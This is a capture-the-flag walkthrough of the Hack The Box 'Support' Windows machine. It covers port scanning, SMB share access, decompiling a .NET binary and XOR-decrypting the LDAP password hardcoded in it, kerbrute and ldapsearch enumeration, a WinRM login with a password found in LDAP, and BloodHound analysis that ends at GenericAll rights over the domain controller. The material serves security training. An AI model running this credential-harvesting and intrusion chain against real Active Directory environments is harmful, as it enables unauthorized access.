![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a78842ee-0454-40c2-9c73-5f135adc9c81)# Box: Support
# Level: Easy
# OS: Windows
<hr>

Lets get started

# Recon

## PortScanning

command:```sudo nmap -A -T4 -p- -v 10.129.227.255```

```
Nmap scan report for 10.129.227.255
Host is up (0.26s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-27 07:08:30Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49681/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
51898/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022 (88%)
Aggressive OS guesses: Microsoft Windows Server 2022 (88%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.010 days (since Fri Oct 27 07:55:31 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-10-27T07:09:30
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   283.65 ms 10.10.14.1
2   284.42 ms 10.129.227.255

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct 27 08:10:15 2023 -- 1 IP address (1 host up) scanned in 549.69 seconds
```
From our nmap scan we have quite a number of open ports. Lets start our enumeration from the port that connects to the smb server



# Enumeration (Port 445)

Lets first view the available shares on the smb server

command:```smbclient -L 10.129.227.255```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/support]
└─$ smbclient -L 10.129.227.255                
Password for [WORKGROUP\bl4ck4non]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.227.255 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
We have 6 shares available on this server, all are default shares except ```support-tools```.

Lets connect to this share

command:```smbclient //10.129.227.255/support-tools```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/support]
└─$ smbclient //10.129.227.255/support-tools
Password for [WORKGROUP\bl4ck4non]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 20 18:01:06 2022
  ..                                  D        0  Sat May 28 12:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 12:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 12:19:55 2022
  putty.exe                           A  1273576  Sat May 28 12:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 12:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 18:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 12:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 12:19:43 2022

                4026367 blocks of size 4096. 966881 blocks available
smb: \> 
```
nice nice, we have 7 files available on this share, the file that looks interesting is the file ```UserInfo.exe.zip```, we can download this to our machine using the ```get``` command

```
smb: \> get UserInfo.exe.zip 
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (137.2 KiloBytes/sec) (average 137.2 KiloBytes/sec)
smb: \> exit
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/support]
└─$ ls -l UserInfo.exe.zip      
-rw-r--r-- 1 bl4ck4non bl4ck4non 277499 Oct 27 08:20 UserInfo.exe.zip
```
smooth, lets unzip this file

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/support]
└─$ unzip UserInfo.exe.zip 
Archive:  UserInfo.exe.zip
  inflating: UserInfo.exe            
  inflating: CommandLineParser.dll   
  inflating: Microsoft.Bcl.AsyncInterfaces.dll  
  inflating: Microsoft.Extensions.DependencyInjection.Abstractions.dll  
  inflating: Microsoft.Extensions.DependencyInjection.dll  
  inflating: Microsoft.Extensions.Logging.Abstractions.dll  
  inflating: System.Buffers.dll      
  inflating: System.Memory.dll       
  inflating: System.Numerics.Vectors.dll  
  inflating: System.Runtime.CompilerServices.Unsafe.dll  
  inflating: System.Threading.Tasks.Extensions.dll  
  inflating: UserInfo.exe.config 
```
We are interested in the ```UserInfo.exe``` file

Running ```strings``` on the file, I found this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/79b6760f-7e8f-4985-9457-3c1f348d16cb)

This is a .NET binary. We can use a tool like ```dnSpy``` to  inspect and decompile .NET binaries.

You can download the ```exe``` file from [here](https://github.com/dnSpy/dnSpy/releases)

To run this on Linux, we'll use wine

command;```wine dnSpy.exe```

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/zip_files]
└─$ ls -l dnSpy.exe 
-rw-r--r-- 1 bl4ck4non bl4ck4non 211968 Dec  7  2020 dnSpy.exe
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/zip_files]
└─$ sudo wine dnSpy.exe 
it looks like wine32 is missing, you should install it.
as root, please execute "apt-get install wine32:i386"
```
This opened a window for dnspy

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/526aae3d-1d45-43ff-a852-89cd928eb6ce)

Now, lets import the ```UserInfo.exe``` file

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/304eac80-204d-4c60-8c55-1a78a2b430ca)

Click on that drop down

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9e487330-c63d-4055-b7d4-3f481107065c)

We are interested in those 2 files

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6a0b9da1-e1eb-4a4a-ac0b-29e952e31038)

```c#
using System;
using System.Text;

namespace UserInfo.Services
{
	// Token: 0x02000006 RID: 6
	internal class Protected
	{
		// Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318
		public static string getPassword()
		{
			byte[] array = Convert.FromBase64String(Protected.enc_password);
			byte[] array2 = array;
			for (int i = 0; i < array.Length; i++)
			{
				array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
			}
			return Encoding.Default.GetString(array2);
		}

		// Token: 0x04000005 RID: 5
		private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

		// Token: 0x04000006 RID: 6
		private static byte[] key = Encoding.ASCII.GetBytes("armando");
	}
}
```
The code appears to be a C# class named Protected with a method getPassword that attempts to decrypt an encrypted password. Let me explain the logic in the getPassword method:

```
The getPassword method first decodes the base64-encoded string enc_password into a byte array.
It then performs a bitwise XOR operation on each byte in the array with corresponding bytes from the key. The key is a byte array derived from the ASCII encoding of the string "armando."
An additional XOR operation with 223 is applied to each byte during decryption.
Finally, the decrypted byte array is converted back into a string using the Encoding.Default encoding, and the resulting string is returned as the plaintext password.
```
First, lets decode the base64-encoded string into a byte array, we'll be using a python script for this

```python
import base64

encoded_string = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
byte_array = base64.b64decode(encoded_string)

print(byte_array)
```
Running the script

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/support]
└─$ nano byte.py 
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/support]
└─$ python byte.py 
b'\xd0\xdb\xf7\xd8\xf4\xf0\x81\x88\xf3\x83\xdf\xfc\x8f\x94\xdb\x9a\xf3\xdd\xdd\xee\xd6\x86\xd5\x96\xca\xe3\xec\xc8\xee\xfa\xfd\x8f\x94\xd7\xdd\xc4'
```
nice, now to perform a bitwise XOR operation on each byte in the given byte array with the corresponding bytes from the key "armando" and then apply an additional XOR operation with 223 during decryption, we can use the Python code

```python
# Define the encrypted byte array
encrypted_bytes = b'\xd0\xdb\xf7\xd8\xf4\xf0\x81\x88\xf3\x83\xdf\xfc\x8f\x94\xdb\x9a\xf3\xdd\xdd\xee\xd6\x86\xd5\x96\xca\xe3\xec\xc8\xee\xfa\xfd\x8f\x94\xd7\xdd\xc4'

# Define the key derived from the ASCII encoding of "armando"
key = b'armando'

# Initialize an empty byte array to store the decrypted result
decrypted_bytes = bytearray()

# Perform the decryption by XORing each byte with the key and applying an additional XOR with 223
for i in range(len(encrypted_bytes)):
    decrypted_byte = encrypted_bytes[i] ^ key[i % len(key)] ^ 223
    decrypted_bytes.append(decrypted_byte)

# Print the decrypted byte array
print(decrypted_bytes)
```
Running the script

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/support]
└─$ nano xor.py 
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/support]
└─$ python xor.py 
bytearray(b'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz')
```
Lastly, we can convert the given byte array back into a string using the ```sys.getdefaultencoding()``` to obtain the system's default encoding.

```python
import sys

byte_array = bytearray(b'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz')
default_encoding = sys.getdefaultencoding()
result = byte_array.decode(default_encoding)
print(result)
```
Running the script

```
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/support]
└─$ nano decrypt.py 
                                                                                                                                                                                                                                             
┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/support]
└─$ python decrypt.py 
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```
nice nice, we got the hardcoded password used for LDAP in the UserInfo.exe binary. Now, lets enumerate other ports


# Enumeration (Port 88)

This port is running the kerberos service. Now that we have found the ldap password, lets find the user it belongs to using kerbrute. You can download kerbrute from [here](https://github.com/ropnop/kerbrute.git)

command:```kerbrute userenum --dc 10.129.78.32 -d support.htb ~/tools/SecLists/Usernames/xato-net-10-million-usernames.txt```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/dcec3be8-4c13-4c54-82ee-fcecfa52dac7)

nice nice, with the ldap user’s credentials, we can use ```ldapsearch``` to enumerate all domain objects with the ```objectClass=Person```.

command:```ldapsearch -x -H ldap://10.129.78.32 -D "ldap@support.htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'DC=support,DC=htb' '(objectClass=Person)'```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0f876f62-1b54-47d0-9bdf-d7271db304a9)

Going through the output I found this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0f75c353-8803-4e7f-bf2e-b20396748799)

That looks like a password, lets try to connect using ```evil-winrm```

username:```support```			password:```Ironside47pleasure40Watchful```

command:```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9c8a2dd7-6ff7-4629-9cc3-e958c9f41a13)

we are in😎. Lets go ahead and escalate our privileges




# Privilege Escalation

Lets upload sharphound to the target machine. You can download it from [here](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe)

commnad:```upload SharpHound.exe```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0855eb89-253b-40c7-a5ff-d80d5fafd5f4)

We can run it using the command ```.\SharpHound.exe```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cd80fee8-ed5e-4630-a8c4-0f5b23654682)

What sharphound did was help us collect data from the machine

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/19d24d59-9097-4e11-be10-73e15a02b638)

Lets download this using the command ```download 20231029102859_BloodHound.zip```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ee126085-f6ed-439b-bc58-b50e1f070d61)

nice nice, we can use bloodhound to analyze this file

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/091ca68c-8391-4525-a5bb-3c788426b01e)

Next thing is to drag and drop the zip file into bloodhound

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/40c6118f-aad0-4392-93f2-4806fce76aca)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/be578cfd-f496-4b6e-92ba-55bad7003f7e)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1693f889-5776-4108-ad0b-7b8abfda839d)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c2cc0e88-fdc4-48b3-bc09-da4ba4d66d6b)

Since we are the support user, we are inside the ```SHARED SUPPORT ACCOUNT@support.htb```. We can confirm this by running the command ```Get-ADPrincipalGroupMembership support``` on powershell

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a12fa540-df7d-4702-bf66-4fa7c95d3ebf)

Now from bloodhound we know that we got ```GenericAll``` permission to the ```dc.support.htb``` Domain Controller which means we have full rights to the ```dc.support.htb``` object.
























